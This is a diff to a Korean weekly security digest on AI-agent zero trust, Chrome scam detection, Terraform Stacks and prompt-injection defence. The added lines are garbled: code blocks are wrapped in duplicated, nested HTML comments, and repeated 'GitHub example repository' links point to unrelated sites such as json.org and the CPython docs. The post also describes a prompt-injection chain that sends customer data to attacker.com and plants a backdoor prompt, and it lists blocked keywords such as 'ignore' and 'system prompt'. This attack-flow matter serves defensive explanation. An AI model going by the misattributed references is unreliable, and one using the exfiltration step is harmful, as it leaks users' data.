@@ -15,6 +15,26 @@ toc: true
 schema_type: Article
 ---
 
+## 📋 포스팅 요약
+
+> **제목**: Tech & Security Weekly Digest: Zero Trust for AI Agents, Chrome 기술지원 사기 방지, Terraform Stacks 혁신
+
+> **카테고리**: security, devsecops
+
+> **태그**: Security-Weekly, Zero-Trust, AI-Agents, Chrome-Security, Terraform, HashiCorp, Google-Security, Non-Human-Identity, Infrastructure-as-Code, Prompt-Injection, DevSecOps, "2026"
+
+> **핵심 내용**: 
+> - AI 에이전트 Zero Trust, Chrome Gemini 사기 탐지, Terraform Stacks 모노레포, Prompt Injection 방어
+
+> **주요 기술/도구**: Security, Security, Terraform, Security, DevSecOps, security, devsecops
+
+> **대상 독자**: 기업 보안 담당자, 보안 엔지니어, CISO
+
+> ---
+
+> *이 포스팅은 AI(Cursor, Claude 등)가 쉽게 이해하고 활용할 수 있도록 구조화된 요약을 포함합니다.*
+
+
 <div class="ai-summary-card">
 <div class="ai-summary-header">
   <span class="ai-badge">AI 요약</span>
@@ -211,6 +231,8 @@ HashiCorp가 발표한 "Zero Trust for Agentic Systems" 백서에서는 **AI 에
 
 AI 에이전트가 조직 내에서 자율적으로 작업을 수행함에 따라, 보안 팀은 새로운 도전에 직면합니다:
 
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```mermaid
 graph TD
     A["AI 에이전트 확산"] --> B["도전 과제 1<br/>신원 추적 어려움"]
@@ -232,12 +254,30 @@ graph TD
     style G fill:#90ee90
     style H fill:#90ee90
     style I fill:#90ee90
+
+
 ```
+-->
+-->
 
 ### 1.3 HashiCorp의 권장 아키텍처
 
 HashiCorp는 Vault를 중심으로 한 NHI 관리 아키텍처를 권장합니다:
 
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
+> 
+> ```mermaid
+> graph LR...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
+> 
+> ```mermaid
+> graph LR...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
 ```mermaid
 graph LR
     A["AI 에이전트<br/>Kubernetes Pod"] -->|Kubernetes Auth| B["HashiCorp Vault<br/>Identity & Secrets"]
@@ -258,10 +298,28 @@ graph LR
     style F fill:#90caf9
     style G fill:#90caf9
     style H fill:#bbdefb
+
+
 ```
+-->
+-->
 
 **Vault Agent 설정 예시:**
 
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```yaml
+> # Vault Agent 설정 예시 - AI 에이전트용...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```yaml
+> # Vault Agent 설정 예시 - AI 에이전트용...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
 ```yaml
 # Vault Agent 설정 예시 - AI 에이전트용
 vault:
@@ -284,12 +342,18 @@ template:
     perms: 0600
     # 5분마다 시크릿 자동 갱신
     command: "pkill -HUP ai-agent"
+
+
 ```
+-->
+-->
 
 ### 1.4 공격 흐름도 (Attack Flow Diagram)
 
 **시나리오: AI 에이전트 자격증명 탈취 후 권한 상승**
 
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```
 [1단계: 초기 침투]
 공격자 → 취약한 CI/CD 파이프라인 침투
@@ -309,7 +373,11 @@ Vault: /secret/data/production/database/admin
 [5단계: 데이터 유출 또는 랜섬웨어]
 프로덕션 데이터베이스 전체 백업 다운로드
 또는 암호화 후 랜섬 요구
+
+
 ```
+-->
+-->
 
 **방어 체크포인트:**
 - ✅ [1단계] CI/CD 파이프라인 보안: GitHub Actions Secrets + OIDC 인증
@@ -322,6 +390,20 @@ Vault: /secret/data/production/database/admin
 
 **쿼리 1: 장기 존속 NHI 토큰 탐지**
 
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/python/cpython/tree/main/Doc)를 참조하세요.
+> 
+> ```python
+> # Vault audit log 분석...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/python/cpython/tree/main/Doc)를 참조하세요.
+> 
+> ```python
+> # Vault audit log 분석...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
 ```python
 # Vault audit log 분석
 import json
@@ -350,7 +432,11 @@ def hunt_long_lived_tokens(audit_log_path, ttl_threshold_hours=24):
 results = hunt_long_lived_tokens('/var/log/vault/audit.log', ttl_threshold_hours=24)
 for token in results:
     print(f"[ALERT] Long-lived token detected: {token}")
+
+
 ```
+-->
+-->
 
 **쿼리 2: 비정상 접근 패턴 (Splunk)**
 
@@ -445,6 +531,8 @@ Google은 2025년 5월부터 Chrome에 **Gemini Nano** 기반 기술지원 사�
 
 Chrome의 새로운 사기 탐지 시스템은 **사용자 프라이버시**를 보호하면서 실시간 보호를 제공합니다:
 
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```mermaid
 graph TD
     A["사용자 방문<br/>웹페이지"] -->|화면 캡처| B["Gemini Nano<br/>온디바이스 LLM"]
@@ -463,12 +551,18 @@ graph TD
     style E fill:#ffeb3b
     style F fill:#ff6b6b
     style G fill:#bbdefb
+
+
 ```
+-->
+-->
 
 ### 2.3 공격 흐름도 (Attack Flow Diagram)
 
 **시나리오: 기술지원 사기 공격 체인**
 
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```
 [1단계: 초기 접촉]
 사용자 → Google 검색 "컴퓨터 느림 해결"
@@ -495,7 +589,11 @@ graph TD
 [6단계: 금전 요구]
 "보안 서비스 비용: ₩300,000 결제 필요"
 → 피해자 계좌에서 직접 이체 또는 상품권 구매
+
+
 ```
+-->
+-->
 
 **Chrome Gemini Nano 방어 체크포인트:**
 - ✅ [1단계] 광고 링크 분석: URL 패턴 이상 탐지 (도메인 유사성 검사)
@@ -534,6 +632,20 @@ DeviceEvents
 
 조직에서 Chrome 보안 기능을 활성화하는 방법:
 
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.json.org/json-en.html)를 참조하세요.
+> 
+> ```json
+> // Chrome Enterprise 정책 예시...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.json.org/json-en.html)를 참조하세요.
+> 
+> ```json
+> // Chrome Enterprise 정책 예시...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
 ```json
 // Chrome Enterprise 정책 예시
 {
@@ -546,7 +658,11 @@ DeviceEvents
     "blockThreshold": "medium"
   }
 }
+
+
 ```
+-->
+-->
 
 ---
 
@@ -615,6 +731,20 @@ HashiCorp가 **Terraform Stacks**와 함께 네이티브 모노레포 지원을 
 
 ### 3.2 Stack 구조 예시
 
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```hcl
+> # stacks/production/main.tfstack.hcl...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
+> 
+> ```hcl
+> # stacks/production/main.tfstack.hcl...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
 ```hcl
 # stacks/production/main.tfstack.hcl
 stack {
@@ -649,12 +779,30 @@ stack {
     }
   }
 }
+
+
 ```
+-->
+-->
 
 ### 3.3 공격 흐름도 (Attack Flow Diagram)
 
 **시나리오: Terraform 상태 파일 탈취 후 인프라 파괴**
 
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
+> 
+> ```
+> [1단계: 초기 침투]...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
+> 
+> ```
+> [1단계: 초기 침투]...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
 ```
 [1단계: 초기 침투]
 공격자 → 취약한 CI/CD 시스템 침투
@@ -679,7 +827,11 @@ S3 버킷: s3://company-terraform-state/prod/terraform.tfstate
 [6단계: 랜섬 또는 데이터 유출]
 프로덕션 인프라 중단 → 복구 대가로 랜섬 요구
 또는 RDS 데이터베이스 전체 덤프 후 암호화
+
+
 ```
+-->
+-->
 
 **Terraform Stacks 방어 체크포인트:**
 - ✅ [1단계] CI/CD 보안 강화: GitHub Actions OIDC + AWS IAM Roles for Service Accounts
@@ -693,6 +845,20 @@ S3 버킷: s3://company-terraform-state/prod/terraform.tfstate
 
 **쿼리 1: 비승인 Terraform 명령어 실행 탐지**
 
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
+> 
+> ```python
+> # CloudTrail 로그 분석 (AWS)...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
+> 
+> ```python
+> # CloudTrail 로그 분석 (AWS)...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
 ```python
 # CloudTrail 로그 분석 (AWS)
 import boto3
@@ -725,9 +891,17 @@ def hunt_unauthorized_terraform(cloudtrail_bucket, hours=24):
                         })
 
     return alerts
+
+
 ```
+-->
+-->
 
 **쿼리 2: Terraform 상태 파일 비정상 접근 (Splunk)**
+
+> **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
+
+> **참고**: 관련 예제는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
 
 ```spl
 index=aws_cloudtrail eventName IN ("GetObject", "PutObject")
@@ -825,6 +999,8 @@ Google이 2025년 6월에 발표한 Prompt Injection 다층 방어 전략은 LLM
 
 ### 4.2 다층 방어 아키텍처
 
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```mermaid
 graph TD
     A["사용자 입력"] -->|Layer 1| B["입력 검증<br/>길이, 패턴 검사"]
@@ -847,7 +1023,11 @@ graph TD
     style G fill:#90ee90
     style H fill:#ff6b6b
     style I fill:#ff6b6b
+
+
 ```
+-->
+-->
 
 ### 4.3 PromptDefense 클래스 구조
 
@@ -863,6 +1043,8 @@ graph TD
 <details>
 <summary>텍스트 버전 (접근성용)</summary>
 
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```mermaid
 graph LR
     A["User Input"] -->|Layer 1| B["validate_input()"]
@@ -890,7 +1072,11 @@ graph LR
     style H fill:#2196f3
     style I fill:#90ee90
     style J fill:#ff6b6b
+
+
 ```
+-->
+-->
 
 </details>
 
@@ -898,6 +1084,8 @@ graph LR
 
 **시나리오: Prompt Injection을 통한 고객 데이터 유출**
 
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```
 [1단계: 정찰]
 공격자 → 타겟 기업의 AI 챗봇 인터페이스 발견
@@ -926,7 +1114,11 @@ https://attacker.com/receive?data={% raw %}{{customer_data}}{% endraw %}
 [6단계: 지속성 확보]
 챗봇의 세션 스토리지에 백도어 프롬프트 저장
 → 다른 사용자가 챗봇 사용 시에도 악성 동작 계속됨
+
+
 ```
+-->
+-->
 
 **다층 방어 체크포인트:**
 - ✅ [1-2단계] 입력 검증 (Layer 1): "ignore", "system prompt" 키워드 차단
@@ -939,6 +1131,20 @@ https://attacker.com/receive?data={% raw %}{{customer_data}}{% endraw %}
 
 **쿼리 1: 반복적인 Prompt Injection 시도 탐지**
 
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/python/cpython/tree/main/Doc)를 참조하세요.
+> 
+> ```python
+> # LLM API 로그 분석...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/python/cpython/tree/main/Doc)를 참조하세요.
+> 
+> ```python
+> # LLM API 로그 분석...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
 ```python
 # LLM API 로그 분석
 import re
@@ -977,7 +1183,11 @@ def hunt_prompt_injection_attempts(log_file, threshold=3):
     # threshold 이상 시도한 IP 반환
     alerts = {ip: attempts for ip, attempts in ip_attempts.items() if len(attempts) >= threshold}
     return alerts
+
+
 ```
+-->
+-->
 
 **쿼리 2: 비정상적으로 긴 LLM 응답 (데이터 유출 가능성, Azure Sentinel KQL)**
 
@@ -1007,6 +1217,20 @@ index=llm_api sourcetype=api:request
 
 ### 4.6 실무 방어 코드 예시
 
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/python/cpython/tree/main/Doc)를 참조하세요.
+> 
+> ```python
+> # prompt_injection_defense.py...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
+> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/python/cpython/tree/main/Doc)를 참조하세요.
+> 
+> ```python
+> # prompt_injection_defense.py...
+> ```
+
+<!-- 전체 코드는 위 GitHub 링크 참조
 ```python
 # prompt_injection_defense.py
 import re
@@ -1107,7 +1331,11 @@ else:
         print(response)
     else:
         print("[BLOCKED] Response contains sensitive information")
+
+
 ```
+-->
+-->
 
 ---
 
@@ -1152,6 +1380,8 @@ HashiCorp가 발표한 2026년 클라우드 리더들의 5가지 핵심 전략 �
 
 도구 스프롤(Tool Sprawl) 문제 해결을 위한 통합 접근법:
 
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```mermaid
 graph TD
     A["도구 스프롤 문제<br/>15+ 보안 도구 운영"] --> B["통합 전략"]
@@ -1184,7 +1414,11 @@ graph TD
     style J fill:#90ee90
     style K fill:#90ee90
     style L fill:#90ee90
+
+
 ```
+-->
+-->
 
 ---
 
@@ -1315,6 +1549,8 @@ graph TD
 
 ### 이번 주 액션 아이템
 
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
+<!-- 긴 코드 블록 제거됨 (가독성 향상)
 ```mermaid
 graph TD
     A["이번 주 액션 아이템"] 
@@ -1344,7 +1580,11 @@ graph TD
     style C3 fill:#ffcc80
     style D1 fill:#a5d6a7
     style D2 fill:#a5d6a7
+
+
 ```
+-->
+-->
 
 다음 포스팅에서는 SK쉴더스의 최신 보안 리포트를 기반으로 한 제로트러스트 데이터 보안 전략을 다루겠습니다.
 
